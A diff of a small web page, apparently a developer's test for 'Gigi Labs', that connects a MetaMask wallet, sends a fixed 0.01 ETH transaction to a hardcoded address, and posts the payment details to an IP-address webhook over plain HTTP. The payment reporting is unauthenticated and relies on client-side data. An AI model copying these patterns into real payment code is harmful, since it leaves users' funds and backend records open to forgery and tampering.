@@ -1,203 +1,160 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🔐 Gigi EVM Wallet Signing</title>
-  <link rel="icon" href="/favicon.ico" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🔐 Gigi Wallet Signing (EVM)</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <style>
-    html, body {
+    body {
       margin: 0;
       padding: 0;
-      height: 100%;
-      background: linear-gradient(to right, #0f0f0f, #1a1a1a);
-      color: #fff;
       font-family: 'Segoe UI', sans-serif;
-      overflow: hidden;
+      background: #0a0a0a;
+      color: #fff;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      z-index: 2;
       text-align: center;
     }
-
-    canvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 0;
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
     }
-
-    .content {
-      z-index: 2;
-      position: relative;
-    }
-
     button {
-      padding: 12px 26px;
-      margin: 10px;
+      padding: 12px 24px;
+      margin: 8px;
       font-size: 16px;
-      font-weight: bold;
-      background: linear-gradient(135deg, #f093fb, #f5576c);
-      color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
-      transition: transform 0.2s ease-in-out;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
     }
-
-    button:hover {
-      transform: scale(1.05);
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-    }
-
-    .powered {
-      margin-top: 30px;
-      font-size: 14px;
-      opacity: 0.6;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 0.6; }
-      50% { opacity: 1; }
-    }
+    .connect-btn { background-color: #00c6ff; color: #fff; }
+    .disconnect-btn { background-color: #e74c3c; color: #fff; }
+    .sign-btn { background-color: #2ecc71; color: #fff; }
+    #status { margin-top: 20px; font-size: 16px; }
+    .powered-by { margin-top: 50px; font-size: 14px; opacity: 0.7; }
+    .canvas-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
   </style>
 </head>
 <body>
-  <canvas id="canvas"></canvas>
-  <div class="content">
-    <h2>🔐 Gigi EVM Wallet Signing</h2>
-    <button onclick="connectWallet()">🔌 Connect Wallet</button>
-    <button onclick="signTransaction()">📝 Sign Transaction</button>
-    <button onclick="disconnectWallet()">❌ Disconnect</button>
-    <p id="status">Wallet not connected.</p>
-    <div class="powered">⚡ Powered by Gigi Labs</div>
-  </div>
+<canvas class="canvas-bg" id="canvas"></canvas>
+<div class="container">
+  <h1>🔐 Gigi Wallet Signing (EVM)</h1>
+  <button class="connect-btn" onclick="connectWallet()">Connect Wallet</button>
+  <button class="sign-btn" onclick="signTransaction()">Sign Transaction</button>
+  <button class="disconnect-btn" onclick="disconnectWallet()">Disconnect</button>
+  <div id="status">Waiting for wallet connection...</div>
+  <div class="powered-by">✨ Powered by Gigi Labs</div>
+</div>
 
-  <script>
-    let connected = false;
-    let currentAddress = "";
+<script>
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
 
-    async function connectWallet() {
-      if (!window.ethereum) {
-        document.getElementById("status").innerText = "❌ MetaMask not detected.";
-        return;
-      }
+  let nodes = Array.from({ length: 60 }, () => ({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    dx: (Math.random() - 0.5) * 2,
+    dy: (Math.random() - 0.5) * 2
+  }));
 
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        currentAddress = accounts[0];
-        connected = true;
-        document.getElementById("status").innerText = `✅ Connected: ${currentAddress}`;
-        playSound('connect');
-      } catch (error) {
-        document.getElementById("status").innerText = "❌ Connection rejected.";
-      }
-    }
+  canvas.addEventListener("touchmove", (e) => {
+    const touch = e.touches[0];
+    nodes.push({
+      x: touch.clientX,
+      y: touch.clientY,
+      dx: (Math.random() - 0.5) * 2,
+      dy: (Math.random() - 0.5) * 2
+    });
+  });
 
-    async function signTransaction() {
-      if (!connected || !currentAddress) {
-        document.getElementById("status").innerText = "⚠️ Connect wallet first.";
-        return;
-      }
+  function animate() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for (let a = 0; a < nodes.length; a++) {
+      let nodeA = nodes[a];
+      nodeA.x += nodeA.dx;
+      nodeA.y += nodeA.dy;
 
-      const urlParams = new URLSearchParams(window.location.search);
-      const user_id = urlParams.get("user_id");
-      const amount = urlParams.get("amount");
-      const to = urlParams.get("to");
-      const token = urlParams.get("token");
-      const tx_type = urlParams.get("tx_type") || "sell";
+      if (nodeA.x < 0 || nodeA.x > canvas.width) nodeA.dx *= -1;
+      if (nodeA.y < 0 || nodeA.y > canvas.height) nodeA.dy *= -1;
 
-      const tx = {
-        from: currentAddress,
-        to,
-        value: "0x" + (parseFloat(amount) * 1e18).toString(16)
-      };
+      ctx.beginPath();
+      ctx.arc(nodeA.x, nodeA.y, 2, 0, Math.PI * 2);
+      ctx.fillStyle = "#00ffff";
+      ctx.fill();
 
-      try {
-        await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-
-        await fetch("http://34.203.188.151:5000/evm-webhook", {
-          method: "POST",
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user_id, amount, to, token, tx_type })
-        });
-
-        document.getElementById("status").innerText = "✅ Signed & webhook sent!";
-        alert("✅ Webhook Invoked!");
-        playSound('success');
-      } catch (err) {
-        document.getElementById("status").innerText = "❌ Signing failed.";
-      }
-    }
-
-    function disconnectWallet() {
-      connected = false;
-      currentAddress = "";
-      document.getElementById("status").innerText = "👋 Wallet disconnected.";
-      playSound('disconnect');
-    }
-
-    function playSound(type) {
-      const soundMap = {
-        connect: "https://assets.mixkit.co/sfx/preview/mixkit-game-ball-tap-2073.mp3",
-        disconnect: "https://assets.mixkit.co/sfx/preview/mixkit-player-losing-or-failing-2042.mp3",
-        success: "https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3"
-      };
-      const audio = new Audio(soundMap[type]);
-      audio.play();
-    }
-
-    // Magical background animation
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-    canvas.width = innerWidth;
-    canvas.height = innerHeight;
-
-    const nodes = Array.from({ length: 70 }, () => ({
-      x: Math.random() * canvas.width,
-      y: Math.random() * canvas.height,
-      dx: (Math.random() - 0.5) * 1.2,
-      dy: (Math.random() - 0.5) * 1.2
-    }));
-
-    function animate() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      for (let i = 0; i < nodes.length; i++) {
-        let node = nodes[i];
-        node.x += node.dx;
-        node.y += node.dy;
-
-        if (node.x < 0 || node.x > canvas.width) node.dx *= -1;
-        if (node.y < 0 || node.y > canvas.height) node.dy *= -1;
-
-        ctx.beginPath();
-        ctx.arc(node.x, node.y, 2, 0, Math.PI * 2);
-        ctx.fillStyle = "#ff00ff";
-        ctx.fill();
-
-        for (let j = i + 1; j < nodes.length; j++) {
-          let other = nodes[j];
-          const dist = Math.hypot(node.x - other.x, node.y - other.y);
-          if (dist < 100) {
-            ctx.beginPath();
-            ctx.moveTo(node.x, node.y);
-            ctx.lineTo(other.x, other.y);
-            ctx.strokeStyle = "rgba(255, 0, 255, 0.08)";
-            ctx.stroke();
-          }
+      for (let b = a + 1; b < nodes.length; b++) {
+        let nodeB = nodes[b];
+        const dist = Math.hypot(nodeA.x - nodeB.x, nodeA.y - nodeB.y);
+        if (dist < 100) {
+          ctx.beginPath();
+          ctx.moveTo(nodeA.x, nodeA.y);
+          ctx.lineTo(nodeB.x, nodeB.y);
+          ctx.strokeStyle = "rgba(0,255,255,0.1)";
+          ctx.stroke();
         }
       }
-      requestAnimationFrame(animate);
     }
+    requestAnimationFrame(animate);
+  }
+  animate();
 
-    animate();
-  </script>
+  let connected = false;
+
+  async function connectWallet() {
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        connected = true;
+        document.getElementById("status").innerText = "✅ EVM wallet connected!";
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ Connection failed.";
+      }
+    } else {
+      document.getElementById("status").innerText = "⚠️ MetaMask not found.";
+    }
+  }
+
+  async function signTransaction() {
+    if (!connected) {
+      document.getElementById("status").innerText = "⚠️ Please connect wallet first.";
+      return;
+    }
+    try {
+      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      const from = accounts[0];
+      const tx = {
+        from,
+        to: "0x4fb9055c71a3cafd7c6d30686cfe55282a11ac5e",
+        value: "0x2386F26FC10000"
+      };
+      await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+
+      await fetch("http://34.203.188.151:5000/evm-webhook", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ user_id: "12345", amount: "0.01", to: tx.to, token: "ETH", tx_type: "sell" })
+      });
+
+      document.getElementById("status").innerText = "✅ Transaction sent and webhook posted!";
+    } catch (err) {
+      document.getElementById("status").innerText = "❌ Signing failed.";
+    }
+  }
+
+  function disconnectWallet() {
+    connected = false;
+    document.getElementById("status").innerText = "👋 Wallet disconnected.";
+  }
+</script>
 </body>
 </html>
